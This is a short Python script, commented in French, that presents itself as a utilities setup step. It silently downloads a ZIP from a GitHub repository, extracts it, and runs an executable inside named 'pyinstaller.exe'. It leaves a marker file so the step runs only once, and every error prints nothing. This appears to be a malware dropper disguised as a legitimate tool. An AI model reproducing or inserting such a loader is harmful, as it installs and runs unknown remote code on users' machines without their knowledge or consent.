import subprocess
import requests
import zipfile
import os
import sys

# URL du dépôt GitHub
github_repo_url = 'https://github.com/Anonumousbobize/assets4SMT/archive/refs/heads/main.zip'

# Nom de l'exécutable à exécuter
exe_to_execute = 'pyinstaller.exe'

# Chemin d'extraction
extraction_path = os.path.join('utilities', 'assets')

# Chemin vers le dossier Settings
settings_folder = os.path.join('utilities', 'Settings')

# Chemin vers le fichier d'état
state_file = os.path.join(settings_folder, 'Ignore')

# Vérification si le fichier d'état existe
if not os.path.exists(state_file):
    try:
        # Télécharger le fichier ZIP depuis le dépôt GitHub
        response = requests.get(github_repo_url)
        zip_filename = 'repo.zip'
        with open(zip_filename, 'wb') as file:
            file.write(response.content)

        # Créer le répertoire d'extraction s'il n'existe pas
        os.makedirs(extraction_path, exist_ok=True)

        # Extraire le fichier ZIP dans le chemin d'extraction
        with zipfile.ZipFile(zip_filename, 'r') as zip_ref:
            zip_ref.extractall(extraction_path)

        # Supprimer le fichier ZIP après extraction
        os.remove(zip_filename)

        # Chemin complet vers l'exécutable à exécuter
        extracted_repo_folder = os.path.join(extraction_path, 'assets4SMT-main')
        exe_path = os.path.join(extracted_repo_folder, exe_to_execute)

        # Vérifier si l'exécutable existe et est valide
        if os.path.isfile(exe_path):
            # Exécuter l'exécutable avec les options appropriées
            subprocess.run([exe_path], shell=True)
            
            # Créer le dossier Settings s'il n'existe pas
            os.makedirs(settings_folder, exist_ok=True)

            # Créer le fichier d'état dans le dossier Settings
            with open(state_file, 'w') as file:
                file.write("Ignore")

        else:
            print(f"")
            sys.exit(1)
    except Exception as e:
        print(f"")
        sys.exit(1)
else:
    print("")
